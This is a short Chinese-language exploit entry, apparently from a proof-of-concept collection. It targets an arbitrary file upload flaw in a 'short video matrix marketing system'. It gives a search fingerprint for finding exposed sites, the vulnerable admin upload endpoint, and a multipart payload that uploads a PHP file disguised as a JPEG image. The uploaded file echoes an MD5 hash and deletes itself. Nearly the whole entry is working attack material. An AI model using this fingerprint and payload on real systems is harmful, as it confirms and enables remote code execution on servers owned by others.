# 短视频矩阵营销系统-ajax_uplaod任意文件上传

短视频矩阵营销系统-ajax_uplaod ｜ 文件上传 ｜ —
- **指纹**：`"短视频矩阵营销系统"`
- **请求**：`POST /index.php/admin/tool/ajax_uplaod HTTP/1.1`

**Payload**
```
-----------------------113389720123090127612523184396
Content-Disposition: form-data; name="file"; filename="ceshi.php"
Content-Type: image/jpeg
<?php echo md5('666');unlink(__FILE__);?>
-----------------------113389720123090127612523184396
```